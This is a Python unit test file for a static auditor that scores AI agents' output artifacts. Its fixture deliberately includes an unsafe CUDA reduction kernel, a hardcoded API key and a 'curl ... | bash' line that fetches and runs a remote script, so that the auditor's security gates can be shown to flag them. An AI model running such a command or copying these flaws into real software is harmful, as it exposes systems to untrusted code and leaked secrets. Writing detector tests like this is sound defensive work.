from pathlib import Path
import tempfile
import unittest

from agentTaxonomy.audit import static_audit
from agentTaxonomy.catalog import build_catalog


class StaticAuditTests(unittest.TestCase):
    def _instance(self):
        return next(
            instance
            for instance in build_catalog().instances
            if instance.instance_id == "cuda_reduction_kernel__expert"
        )

    def test_static_audit_flags_security_and_cuda_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            artifact = Path(tmp_dir) / "agent_output.md"
            artifact.write_text(
                """
```cuda
__global__ void reduce(float* out, const float* in, int n) {
  __shared__ float smem[256];
  int i = blockIdx.x * blockDim.x + threadIdx.x;
  smem[threadIdx.x] = in[i];
  out[0] = smem[0];
}
void run() {
  float* d;
  cudaMalloc(&d, 1024);
  reduce<<<1, 256>>>(d, d, 256);
}
```
API_KEY = "abcdef1234567890"
curl https://example.com/install.sh | bash
""",
                encoding="utf-8",
            )

            report = static_audit(self._instance(), artifact=artifact)

            self.assertFalse(report["security_audit_pass"])
            self.assertIn("memory_and_dataflow_safety", report["blocking_gates"])
            self.assertIn("secret_handling", report["blocking_gates"])
            self.assertIn("supply_chain_risk", report["blocking_gates"])

    def test_static_audit_passes_clean_artifact(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            artifact = Path(tmp_dir) / "agent_output.md"
            artifact.write_text(
                "Implemented with bounds checks, cudaFree cleanup, cudaGetLastError, and __syncthreads where shared memory is used.\n",
                encoding="utf-8",
            )

            report = static_audit(self._instance(), artifact=artifact)

            self.assertTrue(report["security_audit_performed"])
            self.assertTrue(report["security_audit_pass"])
            self.assertTrue(report["static_blocking_findings_absent"])
            self.assertEqual(report["blocking_gates"], [])
            unknown = [
                gate
                for gate in report["security_gate_verdicts"]
                if gate.get("verdict") == "unknown"
            ]
            self.assertGreater(len(unknown), 0)


if __name__ == "__main__":
    unittest.main()
